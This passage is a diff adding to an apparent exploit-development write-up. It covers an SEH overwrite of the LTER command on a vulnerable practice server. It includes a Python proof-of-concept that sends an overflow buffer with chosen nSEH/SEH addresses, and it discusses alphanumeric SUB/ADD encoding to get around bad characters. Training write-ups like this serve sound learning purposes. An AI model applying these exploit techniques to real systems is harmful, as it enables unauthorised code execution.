@@ -161,3 +161,63 @@ s.close()
 ##### Checking the stack, we see an interesting response.
 
 ![](/assets/img/LTER/5.png)
+
+##### Interesting, it seems as after character 80, no other byte will be parsed as desired. 
+
+#### Controlling the flow.
+
+##### As in any other SEH Based exploit, we require a PPR address, along with an jump, and, due to the fact that bytes such as EB and 90 are discarded, it must be ascii, such as a JO/JNO for example.
+
+###### Listing all modules
+
+![](/assets/img/LTER/6.png)
+
+##### It seems as essfunc.dll may help once again.
+
+###### Listing all PPR addresses within essfunc.dll.
+
+![](/assets/img/LTER/7.png)
+
+##### Nice! Now we can select the second or third address to use in order to overwrite the SEH value, as these are ascii printable.
+
+###### PoC code:
+
+```term
+import socket, sys, struct
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x6250195E)
+
+buffer = "LTER /.:/" + "A" * 3515 + nseh + seh + "C" * 200
+
+host = sys.argv[1]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, 9999))
+
+s.send(buffer)
+
+s.close()
+```
+
+###### Response of the SEH Chain.
+
+![](/assets/img/LTER/8.png)
+
+##### If this is run, it will display a black screen, as 200 C's are more than the server is able to handle. Due to this, we just grab a pointer address and scroll down, just to find our executed code.
+
+![](/assets/img/LTER/9.png)
+
+### Time to play games.
+
+##### We have executed code! What now? We are not able to simply shove down an encoded msfvenom shell or aligning it nor calling it! Due to space issues and char restriction we find ourselves on a tricky scenario.
+
+##### In order to exploit this server, i came up with the following thinking:
+
++ Inserting my purely alphanumeric payload using ESI way back at the beginning of the buffer.
++ Aligning ESI to such.
++ Use a PUSH ESI, follwed by a RET.
+
+##### This method sounds beautiful, doesn't it? The main issue here is that the instruction RET has an opcode of C3, which means that it may not be parsed as we would like to, neither we can encode this opcode, as we don't have enough space for that. To fix this, i decided to pursue the method of SUB/ADD encoding, in which a series of opcodes are encoded and then decoded if the ESP pointer is pointing at a lower address than this encoded instructions, i over simplified how this method works, but it is enough to know what it does. 
+
